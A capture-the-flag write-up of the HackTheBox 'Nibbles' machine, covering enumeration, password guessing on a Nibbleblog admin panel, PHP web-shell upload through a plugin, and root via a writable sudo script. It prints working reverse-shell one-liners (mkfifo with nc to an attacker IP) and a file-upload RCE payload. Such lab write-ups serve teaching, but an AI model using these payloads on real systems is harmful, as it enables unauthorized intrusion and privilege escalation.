---
title: 🟢 HTB - Nibbles
date: 2022-10-02
categories: [HackTheBox, Machines]
tags: [gobuster, cewl]
description: Write up of the Nibbles box from HackTheBox.
---

Let's walk through the box **Nibbles**, an easy-rated Linux box that showcases common enumeration tactics, basic web application exploitation, and a file-related misconfiguration to escalate privileges.

> For this writeup I will say that the IP adresses are the following:
>
> - **attack machine** is `10.10.10.1`
>
> - **target machine** is `10.10.10.2`
>   {: .prompt-warning }

## Enumeration

Firstly let's do some basic enumeration with nmap.
We will begin with a simple quick scan to discover common open ports and service versions:

```bash
nmap -sV --open 10.10.10.2
```

We quickly see two open ports:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's start another scan, a full one this time, to be sure to not miss any unusual port:

```bash
nmap -sV -p- 10.10.10.2
```

While the full scan is running we can check the two known open ports with the defaults nmap scripts:

```bash
nmap -sC -p 22,80 10.10.10.2
```

Unfortunatly the full scan and the script scan didn't finish with something useful for us. Now let's look at the web server we found.

## Web Enumeration

When we open firefox on the address there is just one message displayed: Hello world!

Checking the page source reveal an interesting comment:

```html
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

A simple web research on **Nibbleblog** shows that it's a PHP based blog engine with a well know File Upload Vulnerability which allows an authenticated attacker to upload and execute PHP code on the server. We still don't know yey which version on Nibbleblog is running this server but it's still something good to know.

Now it's time to use gobuster to discover hidden directories:

```bash
gobuster dir -w /path/to/wordlist/common.txt -u 10.10.10.2
```

Nothing interesting with this scan. Let's try now to add the directory found in the html comment:

```bash
gobuster dir -w /path/to/wordlist/common.txt -u 10.10.10.2/nibbleblog/
==========================================================================
/.hta                 (Status: 403) [Size: 302]
/.htaccess            (Status: 403) [Size: 307]
/.htpasswd            (Status: 403) [Size: 307]
/admin                (Status: 301) [Size: 323] [--> http://10.10.10.2/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/content              (Status: 301) [Size: 325] [--> http://10.10.10.2/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]
/languages            (Status: 301) [Size: 327] [--> http://10.10.10.2/nibbleblog/languages/]
/plugins              (Status: 301) [Size: 325] [--> http://10.10.10.2/nibbleblog/plugins/]
/README               (Status: 200) [Size: 4628]
/themes               (Status: 301) [Size: 324] [--> http://10.10.10.2/nibbleblog/themes/]
```

Many directories found here!

After looking at each here are the interesting ones for now:

- admin/ -> Many files here
- admin.php -> login form
- content/ ->
- README/ -> confirm the vulnerable version

Can't bruteforce login -> error message to blacklist us

In /content/private we find user.xml containing the admin user and we can see some blacklisted addresses

Nothing seems to leak the password. Finding the word nibbles in many files is worth giving it a try with the admin user.

Bingo!

Not easy to guess a password like that. HackTheBox advices us to use tools such as [CeWL](https://github.com/digininja/CeWL) to create custom generated wordlist based on a website.

# Initial Foothold

Now we are logged as admin let's take time to walk the administration panel.
Attempting to make a new page and embed code or upload files does not seem like the path. Let us check out the plugins page.

On the configuration page of the My image plugin we can see an upload form. Here we will try to send some PHP code to the server:

Firstly let's try to print the id command by savin the below code into a test.php file and uploading it:

```php
<?php system('id'); ?>
```

Now if we cURL the good URL:

```bash
curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

- now let's upload a reverse shell, inspired by payloadallthethings: <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
- setup the nc listener : nc -lvnp 9443
- add python3 -c 'import pty; pty.spawn("/bin/bash")' to upgrade the shell
- listing files shows user.txt and personal.zip

> here is the user flag !

# Privilege Escalation

- unzip the zip and see a monitor.sh
- let's move linpeas.sh to the victim machine
- python -m http.server 8000
- wget 10.10.10.1:8000/linpeas.sh
- chmod +x linpeas.sh
- ./linpeas.sh
- The nibbler user can run the monitor.sh file with root privs and us we can modify the content! So we will append a reverse shell cmd to the end of the file to get root access
- echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh
- nc -lvnp 4445
- sudo monitor.sh

> Here is the root flag !
